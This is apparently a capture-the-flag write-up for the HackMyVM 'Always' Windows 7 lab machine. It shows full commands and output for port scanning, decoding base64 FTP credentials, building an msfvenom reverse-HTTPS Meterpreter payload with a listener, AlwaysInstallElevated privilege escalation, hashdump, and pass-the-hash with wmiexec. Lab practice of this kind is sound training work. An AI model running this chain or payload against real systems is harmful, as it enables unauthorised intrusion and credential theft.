| Name   | Difficulty | OS      | Target IP    | Link                                               |
| ------ | ---------- | ------- | ------------ | -------------------------------------------------- |
| Always | Easy       | Windows | 192.168.0.72 | https://hackmyvm.eu/machines/machine.php?vm=Always |

### ARP Scan

```bash
garffff@garffff:~/hackmyvm/always$ sudo arp-scan -l | grep db
192.168.0.72	08:00:27:b2:fe:db	PCS Systemtechnik GmbH
```

### Nmap Scan - TCP

```bash
garffff@garffff:~/hackmyvm/always$ sudo nmap -p- -sV -sC 192.168.0.72 -oA nmap/always.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 10:55 GMT
Nmap scan report for 192.168.0.72
Host is up (0.00047s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-10-31T10:57:33+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8080/tcp  open  http               Apache httpd 2.4.57 ((Win64))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: We Are Sorry
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 08:00:27:B2:FE:DB (Oracle VirtualBox virtual NIC)
Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -30m00s, deviation: 1h00m00s, median: 0s
|_nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b2:fe:db (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Always-PC
|   NetBIOS computer name: ALWAYS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-31T12:57:28+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-31T10:57:28
|_  start_date: 2024-10-31T10:53:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.01 seconds
```

Looking at port 80, not much going on here:

![[Pasted image 20241031114642.png]]

Doing a directory bruteforce, we see a hidden directory called Admin:

```bash
garffff@garffff:~/hackmyvm/always$ feroxbuster -u http://192.168.0.72:8080/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.0.72:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l       20w      178c http://192.168.0.72:8080/
301      GET        7l       20w      239c http://192.168.0.72:8080/ADMIN => http://192.168.0.72:8080/ADMIN/
301      GET        7l       20w      239c http://192.168.0.72:8080/Admin => http://192.168.0.72:8080/Admin/
200      GET        8l       20w      178c http://192.168.0.72:8080/Index.html
301      GET        7l       20w      239c http://192.168.0.72:8080/admin => http://192.168.0.72:8080/admin/
200      GET       34l       66w      917c http://192.168.0.72:8080/ADMIN/admin_notes.html
200      GET       97l      212w     3012c http://192.168.0.72:8080/ADMIN/Index.html
200      GET       34l       66w      917c http://192.168.0.72:8080/Admin/admin_notes.html
200      GET       97l      212w     3012c http://192.168.0.72:8080/Admin/Index.html
200      GET       34l       66w      917c http://192.168.0.72:8080/admin/admin_notes.html
200      GET       97l      212w     3012c http://192.168.0.72:8080/admin/Index.html
200      GET        8l       20w      178c http://192.168.0.72:8080/index.html
200      GET       97l      212w     3012c http://192.168.0.72:8080/Admin/index.html
[####################] - 2m    409576/409576  0s      found:13      errors:30028  
[####################] - 33s    81908/81908   2485/s  http://192.168.0.72:8080/ 
[####################] - 48s    81908/81908   1701/s  http://192.168.0.72:8080/ADMIN/ 
[####################] - 86s    81908/81908   950/s   http://192.168.0.72:8080/Admin/ 
[####################] - 58s    81908/81908   1411/s  http://192.168.0.72:8080/admin/ 
[####################] - 2m     81908/81908   826/s   http://192.168.0.72:8080/cgi-bin/
```

Looking at the admin directory, we have a username and password screen:

![[Pasted image 20241031114748.png]]

Looking at source, there is a `admin_notes.html` file:

![[Pasted image 20241031114813.png]]

Looking at `admin_notes.html` file, we have text encoded in base64:

![[Pasted image 20241031114837.png]]

Decoding this string there is a username and password for the FTP service:

```bash
garffff@garffff:~/hackmyvm/always$ echo -n 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' | base64 -d
ftpuser:KeepGoingBro!!!
```

Logging into FTP service there is a new file that points to a hidden file on the server:

```bash
Connected to 192.168.0.72.
220 Microsoft FTP Service
Name (192.168.0.72:garffff): ftpuser
331 Password required for ftpuser.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49185|)
150 Opening ASCII mode data connection.
10-01-24  07:17PM                   56 robots.txt
226 Transfer complete.
ftp> get robots.txt
local: robots.txt remote: robots.txt
229 Entering Extended Passive Mode (|||49188|)
150 Opening ASCII mode data connection.
100% |*************************************************************************************************************************************************************************************************|    56        3.55 MiB/s    00:00 ETA
226 Transfer complete.
56 bytes received in 00:00 (749.14 KiB/s)
ftp> exit
221 Goodbye.
garffff@garffff:~/hackmyvm/always/ftp$ cat robots.txt 
User-agent: *
Disallow: /admins-secret-pagexxx.html
```

Looking at the file, there is another base64 string:

![[Pasted image 20241031115113.png]]

We have a new set of credentials:

```bash
garffff@garffff:~/hackmyvm/always$ echo -n 'WW91Q2FudEZpbmRNZS4hLiE=' | base64 -d
YouCantFindMe.!.!
```

This password does not work on any service. Suspect it is a box issue

Login into the VM directly as the ftpuser works. Do get a shell, I used the following msfvenom:

```bash
garffff@garffff:~/hackmyvm/always$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.51 LPORT=443 -f exe > shell.exe
[sudo] password for garffff:            
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 687 bytes
Final size of exe file: 7168 bytes
```

Setting up Meterpreter:

```bash
garffff@garffff:~/hackmyvm/always$ sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.0.51;set LPORT 443;run;"
[sudo] password for garffff:            
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_https
LHOST => 192.168.0.51
LPORT => 443
[*] Started HTTPS reverse handler on https://192.168.0.51:443
```

Navigating to my webserver and loading the shell.exe:

![[Pasted image 20241031115226.png]]

Gave me a reverse connection:

```bash
garffff@garffff:~/hackmyvm/always$ sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.0.51;set LPORT 443;run;"
[sudo] password for garffff:            
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_https
LHOST => 192.168.0.51
LPORT => 443
[*] Started HTTPS reverse handler on https://192.168.0.51:443
[!] https://192.168.0.51:443 handling request from 192.168.0.72; (UUID: taosclcc) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.0.51:443 handling request from 192.168.0.72; (UUID: taosclcc) Staging x64 payload (202844 bytes) ...
[!] https://192.168.0.51:443 handling request from 192.168.0.72; (UUID: taosclcc) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.0.51:443 -> 192.168.0.72:49171) at 2024-10-31 11:37:05 +0000

meterpreter >
```


Loading local_exploit_suggester:

```bash
msf6 exploit(multi/handler) > search local suggest

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
   1  post/osx/manage/sonic_pi                  .                normal  No     OS X Manage Sonic Pi
   2    \_ action: Run                          .                .       .      Run Sonic Pi code
   3    \_ action: Stop                         .                .       .      Stop all jobs


Interact with a module by name or index. For example info 3, use 3 or use post/osx/manage/sonic_pi
After interacting with a module you can manually set a ACTION with set ACTION 'Stop'

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.0.72 - Collecting local exploits for x64/windows...
[*] 192.168.0.72 - 198 exploit checks are being tried...
[+] 192.168.0.72 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 192.168.0.72 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.0.72 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.0.72 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 192.168.0.72 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/ms15_078_atmfd_bof: The service is running, but could not be validated.
[+] 192.168.0.72 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[+] 192.168.0.72 - exploit/windows/local/virtual_box_opengl_escape: The service is running, but could not be validated.
[*] Running check method for exploit 47 / 47
[*] 192.168.0.72 - Valid modules for session 1:

```

Using the always_install_elevated exploit:

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.51     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/always_install_elevated) > set session 1
session => 1
msf6 exploit(windows/local/always_install_elevated) > run

[*] Started reverse TCP handler on 192.168.0.51:4444 
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\FmqMppFiltHhG.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 192.168.0.72
[*] Meterpreter session 2 opened (192.168.0.51:4444 -> 192.168.0.72:49175) at 2024-10-31 11:38:33 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

Can't get a shell:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
[-] Error running command shell: Rex::ArgumentError An invalid argument was specified. Unknown type for arguments
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
[-] Error running command shell: Rex::ArgumentError An invalid argument was specified. Unknown type for arguments
```

Grabbing hashes:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:16cbb99ac5e376eac08af2a41e651962:::
Always:1000:aad3b435b51404eeaad3b435b51404ee:07e18c322a0a2c26ba038d5e3a89fcde:::
ftpuser:1001:aad3b435b51404eeaad3b435b51404ee:05e105d16023ed7ff3217d65ce41ac2a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Logging on as administrator and grabbing the root flag:

```bash
garffff@garffff:~/hackmyvm/always$ wmiexec.py administrator@192.168.0.72 -hashes :16cbb99ac5e376eac08af2a41e651962
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd c:\users\administrator\desktop
c:\users\administrator\desktop>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 C s�r�c�s�ndeki birimin etiketi yok.
 Birim Seri Numaras�: 1470-2F5F

 c:\users\administrator\desktop dizini

03.10.2024  10:37    <DIR>          .
03.10.2024  10:37    <DIR>          ..
06.10.2024  15:25                22 root.txt
               1 Dosya               22 bayt
               2 Dizin   20.729.208.832 bayt bo�

c:\users\administrator\desktop>type root.txt
HMV{White_Flag_Raised}
```

